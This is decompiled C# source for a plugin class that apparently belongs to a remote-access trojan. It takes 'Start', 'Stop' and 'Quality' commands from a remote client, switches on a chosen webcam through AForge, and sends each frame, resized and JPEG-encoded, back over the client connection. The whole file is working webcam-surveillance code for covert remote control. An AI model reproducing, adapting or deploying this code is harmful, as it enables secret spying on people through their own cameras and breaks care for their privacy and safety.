using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Windows.Threading;
using AForge.Video;
using AForge.Video.DirectShow;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static bool IsOk = false;

	public static int Quality = 0;

	public static VideoCaptureDevice video;

	public static EncoderParameters encoderParams;

	private static ImageCodecInfo encoder = ImageCodecInfo.GetImageEncoders().First((ImageCodecInfo c) => c.FormatID == ImageFormat.Jpeg.Guid);

	public static void Read(byte[] data)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Start":
			{
				FilterInfoCollection filterInfoCollection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
				IsOk = true;
				Quality = (byte)array[1];
				encoderParams = new EncoderParameters(1);
				encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
				video = new VideoCaptureDevice(filterInfoCollection[(byte)array[2]].MonikerString);
				video.NewFrame += CaptureRun;
				video.Start();
				break;
			}
			case "Stop":
				Stoped();
				break;
			case "Quality":
				Quality = (byte)array[1];
				encoderParams = new EncoderParameters(1);
				encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}

	private static void CaptureRun(object sender, NewFrameEventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		if (IsOk && Client.itsConnect)
		{
			Bitmap bitmap = (Bitmap)((Image)e.Frame).Clone();
			Client.Send(LEB128.Write(new object[3]
			{
				"Camera",
				"Image",
				BitmapToByteArrayWithQuality(bitmap, encoderParams)
			}));
		}
	}

	public static void Stoped()
	{
		if (IsOk)
		{
			IsOk = false;
			video.NewFrame -= CaptureRun;
			Dispatcher.CurrentDispatcher.InvokeShutdown();
			video.SignalToStop();
			video.WaitForStop();
			video.Stop();
			video = null;
		}
	}

	public static byte[] BitmapToByteArrayWithQuality(Bitmap bitmap, EncoderParameters encoderParams)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		int num = ((Image)bitmap).Width / 2;
		int num2 = ((Image)bitmap).Height / 2;
		int num3;
		int num4;
		if (((Image)bitmap).Width > ((Image)bitmap).Height)
		{
			num3 = num;
			num4 = (int)((float)((Image)bitmap).Height * ((float)num / (float)((Image)bitmap).Width));
		}
		else
		{
			num3 = (int)((float)((Image)bitmap).Width * ((float)num2 / (float)((Image)bitmap).Height));
			num4 = num2;
		}
		Bitmap val = new Bitmap(num3, num4);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.InterpolationMode = (InterpolationMode)3;
				val2.SmoothingMode = (SmoothingMode)1;
				val2.CompositingQuality = (CompositingQuality)1;
				val2.DrawImage((Image)(object)bitmap, 0, 0, num3, num4);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			using MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, encoder, encoderParams);
			return memoryStream.ToArray();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		foreach (ImageCodecInfo val in imageEncoders)
		{
			if (val.FormatID == format.Guid)
			{
				return val;
			}
		}
		return null;
	}
}
